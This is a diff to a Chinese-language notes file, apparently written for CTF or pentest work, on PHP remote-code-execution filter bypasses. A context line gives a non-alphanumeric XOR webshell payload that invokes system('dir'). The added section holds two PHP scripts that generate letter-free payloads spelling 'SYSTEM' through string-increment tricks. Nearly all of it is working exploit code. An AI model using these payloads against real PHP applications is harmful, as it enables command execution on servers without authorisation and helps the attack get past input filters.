@@ -123,3 +123,53 @@ if (isset($_GET['code'])) {
 ```php
 $中="`{{{"^"?<>/";${$中}[国](${$中}[强]);&国=system&强=dir
 ```
+## 生成PHP脚本
+```php
+<?php
+$_=[];
+$_=@"$_"; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$__=$_;
+// $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+for($count =1;$count < 26;$count++){
+    $__++;
+    if($__ == 'S'){
+        $payload = "<?=\$__=\$_?>";
+        for($i = 1;$i <= $count;$i++){
+            $payload .= "<?=\$__++?>";
+        }
+        $payload.= '<?=$___.=$__?>';
+        break;
+    }
+    var_dump("this tern:".$__);
+}
+var_dump($payload);
+?>
+```
+```php
+<?php
+#author:Hpdoger
+$rce = "SYSTEM";
+$payload = "\$_=(([]._)[_==__]);";
+for($i=0;$i<strlen($rce);$i++){
+    $next = getStr($rce[$i]);
+    $payload.= "\$__=\$_;$next\$___.=\$__;";
+}
+function getStr($str){
+    $_=(([]._)[_==__]);
+    $__=$_;
+    for($count =1;$count < 30;$count++){
+        $__++;
+        if($__ == $str){
+            $payload = "\$_=(([]._)[_==__]);\$__=\$_;";
+            $iter = "";
+            for($i = 1;$i <= $count;$i++){
+                $iter .= "\$__++;";
+            }
+            return $iter;
+        }
+        var_dump("this tern:".$__);
+    }
+}
+var_dump($payload);
+```
